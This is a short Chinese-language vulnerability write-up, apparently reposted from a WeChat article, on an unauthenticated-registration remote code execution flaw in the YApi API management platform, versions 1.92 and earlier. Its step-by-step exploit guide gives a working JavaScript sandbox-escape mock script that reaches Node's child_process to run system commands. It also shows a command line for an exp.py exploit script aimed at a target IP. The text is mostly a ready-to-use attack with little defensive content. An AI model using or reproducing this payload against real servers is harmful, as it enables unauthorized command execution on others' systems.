from https://mp.weixin.qq.com/s/SF4rRHXse5arq9jjZKPsqQ

## 简介

YAPI接口管理平台是国内某旅行网站的大前端技术中心开源项目，使用mock数据/脚本作为中间交互层，为前端后台开发与测试人员提供更优雅的接口管理服务，该系统被国内较多知名互联网企业所采用。

YApi 是高效、易用、功能强大的 api 管理平台。但因为大量用户使用 YAPI的默认配置并允许从外部网络访问 YApi服务，导致攻击者注册用户后，即可通过 Mock功能远程执行任意代码。

## 影响版本

<=V1.92 All

## 漏洞利用步骤

1.注册一个账户
2.登录账户，创建一个项目
3.然后选择设置全局的mock脚本

```
const sandbox = this
const ObjectConstructor = this.constructor
const FunctionConstructor = ObjectConstructor.constructor
const myfun = FunctionConstructor('return process')
const process = myfun()
mockJson = process.mainModule.require("child_process").execSync("whoami && ps -ef").toString()
```

4.创建一个接口，访问该接口的url即可


## exp

[exp.py](./exp.py)

```
python3 exp.py -u http://111.111.111.111:80800 -e "netstat -ntlp"
```